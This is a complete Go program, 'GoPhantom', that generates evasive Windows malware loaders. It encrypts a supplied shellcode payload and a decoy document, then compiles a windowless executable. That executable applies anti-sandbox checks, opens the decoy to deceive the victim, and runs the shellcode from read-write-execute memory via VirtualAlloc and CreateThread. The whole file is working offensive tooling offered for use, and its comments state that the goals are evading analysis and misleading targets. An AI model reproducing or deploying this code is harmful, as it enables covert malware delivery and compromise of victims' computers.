package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"text/template"
)

const logo = `
   ___        ___ _                 _                  
  / _ \___   / _ \ |__   __ _ _ __ | |_ ___  _ __ ___  
 / /_\/ _ \ / /_)/ '_ \ / _' | '_ \| __/ _ \| '_ ' _ \ 
/ /_\\ (_) / ___/| | | | (_| | | | | || (_) | | | | | |
\____/\___/\/    |_| |_|\__,_|_| |_|\__\___/|_| |_| |_|

          >> Advanced Payload Loader Generator <<
                                           by hsad
`

// loaderTemplate 是最终加载器可执行文件的 Go 源代码模板。
const loaderTemplate = `
//go:build windows
// +build windows

// 由 GoPhantom 生成的最终加载器
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"time"
	"unsafe"
	"golang.org/x/sys/windows"
)

// 这些常量由生成器在编译时动态注入。
const (
	encryptedShellcodeBase64 = "{{.EncryptedPayload}}"
	encryptedDecoyBase64     = "{{.EncryptedDecoy}}"
	aesKeyBase64             = "{{.Key}}"
	decoyFileName            = "{{.DecoyFileName}}"
)

// decryptAESGCM 使用 AES-256-GCM 解密 Base64 编码的数据。
func decryptAESGCM(encodedCiphertext, encodedKey string) ([]byte, error) {
	key, err := base64.StdEncoding.DecodeString(encodedKey)
	if err != nil { return nil, fmt.Errorf("key decoding failed: %v", err) }
	
	ciphertext, err := base64.StdEncoding.DecodeString(encodedCiphertext)
	if err != nil { return nil, fmt.Errorf("ciphertext decoding failed: %v", err) }

	block, err := aes.NewCipher(key)
	if err != nil { return nil, fmt.Errorf("failed to create new cipher: %v", err) }

	gcm, err := cipher.NewGCM(block)
	if err != nil { return nil, fmt.Errorf("failed to create new GCM: %v", err) }

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize { return nil, fmt.Errorf("ciphertext is too short") }

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// antiSandboxChecks 执行基本的反沙箱环境检查，以规避自动化分析。
func antiSandboxChecks() {
	// 沙箱环境通常分配较少的CPU核心。
	if runtime.NumCPU() < 2 {
		os.Exit(0)
	}

	// 沙箱环境通常分配较少的物理内存。
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	globalMemoryStatusEx := kernel32.NewProc("GlobalMemoryStatusEx")
	
	type memoryStatusEx struct {
		Length               uint32
		MemoryLoad           uint32
		TotalPhys            uint64
		AvailPhys            uint64
		TotalPageFile        uint64
		AvailPageFile        uint64
		TotalVirtual         uint64
		AvailVirtual         uint64
		AvailExtendedVirtual uint64
	}

	var memStatex memoryStatusEx
	memStatex.Length = uint32(unsafe.Sizeof(memStatex))
	
	ret, _, _ := globalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memStatex)))
	if ret != 0 {
		// 若物理内存小于 4GB，则判定为沙箱环境并退出。
		if memStatex.TotalPhys/1024/1024/1024 < 4 {
			os.Exit(0)
		}
	}
}

// executeShellcode 分配内存，复制并以 "Fire and Forget" 模式执行 shellcode。
func executeShellcode(shellcode []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	createThread := kernel32.NewProc("CreateThread")

	// 使用 VirtualAlloc 在当前进程中分配一块具有读、写、执行权限的内存。
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return // 分配失败则静默退出，不暴露行为。
	}

	// 将 shellcode 复制到新分配的内存中。
	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode):len(shellcode)]
	copy(dst, shellcode)
	
	// 使用 CreateThread 在新线程中执行 shellcode，实现与主线程分离。
	createThread.Call(0, 0, addr, 0, 0, 0)
}

func main() {
	antiSandboxChecks()

	// 解密并执行诱饵文件，迷惑目标用户。
	decoyBytes, err := decryptAESGCM(encryptedDecoyBase64, aesKeyBase64)
	if err == nil {
		decoyPath := filepath.Join(os.Getenv("PUBLIC"), decoyFileName)
		_ = os.WriteFile(decoyPath, decoyBytes, 0644)
		
		verb, _ := windows.UTF16PtrFromString("open")
		path, _ := windows.UTF16PtrFromString(decoyPath)
		windows.ShellExecute(0, verb, path, nil, nil, windows.SW_SHOWNORMAL)
	}
	
	// 在后台解密并执行核心荷载。
	shellcode, err := decryptAESGCM(encryptedShellcodeBase64, aesKeyBase64)
	if err == nil {
		executeShellcode(shellcode)
	}

	// 短暂休眠以确保诱饵文件有足够时间弹出，增强伪装效果。
	time.Sleep(3 * time.Second)
}
`

// TemplateData 用于向模板中注入数据。
type TemplateData struct {
	EncryptedPayload string
	EncryptedDecoy   string
	Key              string
	DecoyFileName    string
}

// encryptAESGCM 使用 AES-256-GCM 加密数据并返回 Base64 编码的字符串。
func encryptAESGCM(plaintext []byte, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}

	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func main() {
	log.SetFlags(0) // 移除日志前缀，使 Logo 输出更干净
	log.Println(logo)

	// --- 参数定义 ---
	decoyFile := flag.String("decoy", "", "Required: Path to the decoy file (e.g., a PDF or image).")
	payloadFile := flag.String("payload", "", "Required: Path to the raw x64 shellcode file (e.g., beacon.bin).")
	outputFile := flag.String("out", "FinalLoader.exe", "Optional: Final output executable name.")
	flag.Parse()

	// --- 参数校验 ---
	if *decoyFile == "" || *payloadFile == "" {
		log.Println("\nError: Both -decoy and -payload flags are required.")
		log.Println("Usage:")
		flag.PrintDefaults()
		os.Exit(1)
	}

	// --- 文件读取 ---
	decoyBytes, err := os.ReadFile(*decoyFile)
	if err != nil {
		log.Fatalf("[-] Failed to read decoy file: %v", err)
	}

	shellcodeBytes, err := os.ReadFile(*payloadFile)
	if err != nil {
		log.Fatalf("[-] Failed to read payload file: %v", err)
	}

	// --- 加密流程 ---
	log.Println("[+] Generating unique AES-256-GCM key...")
	aesKey := make([]byte, 32) // AES-256 需要 32 字节的密钥
	if _, err := rand.Read(aesKey); err != nil {
		log.Fatalf("[-] Failed to generate AES key: %v", err)
	}

	log.Println("[+] Encrypting decoy file with shared key...")
	encryptedDecoy, err := encryptAESGCM(decoyBytes, aesKey)
	if err != nil {
		log.Fatalf("[-] Failed to encrypt decoy file: %v", err)
	}

	log.Println("[+] Encrypting payload file with the same shared key...")
	encryptedShellcode, err := encryptAESGCM(shellcodeBytes, aesKey)
	if err != nil {
		log.Fatalf("[-] Failed to encrypt payload file: %v", err)
	}

	// --- 模板填充 ---
	data := TemplateData{
		EncryptedPayload: encryptedShellcode,
		EncryptedDecoy:   encryptedDecoy,
		Key:              base64.StdEncoding.EncodeToString(aesKey),
		DecoyFileName:    filepath.Base(*decoyFile),
	}

	log.Println("[+] Generating loader source code...")
	tmpl, err := template.New("loader").Parse(loaderTemplate)
	if err != nil {
		log.Fatalf("[-] Failed to parse loader template: %v", err)
	}

	var sourceCode bytes.Buffer
	if err := tmpl.Execute(&sourceCode, data); err != nil {
		log.Fatalf("[-] Failed to execute template: %v", err)
	}

	// --- 编译流程 ---
	tmpfile, err := os.CreateTemp("", "loader-*.go")
	if err != nil {
		log.Fatalf("[-] Failed to create temp file: %v", err)
	}
	defer os.Remove(tmpfile.Name())

	if _, err := tmpfile.Write(sourceCode.Bytes()); err != nil {
		log.Fatalf("[-] Failed to write to temp file: %v", err)
	}
	if err := tmpfile.Close(); err != nil {
		log.Fatalf("[-] Failed to close temp file: %v", err)
	}

	log.Printf("[+] Cross-compiling for windows/amd64 to %s...", *outputFile)
	// -s: 禁用符号表
	// -w: 禁用 DWARF 调试信息
	// -H windowsgui: 编译为 Windows GUI 程序，运行时不显示控制台窗口
	ldflags := "-s -w -H windowsgui"
	cmd := exec.Command("go", "build", "-o", *outputFile, "-ldflags", ldflags, tmpfile.Name())
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")

	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf("[-] Compilation failed:\n%s", string(output))
	}

	log.Printf("\n[✓] Successfully generated loader: %s\n", *outputFile)
}
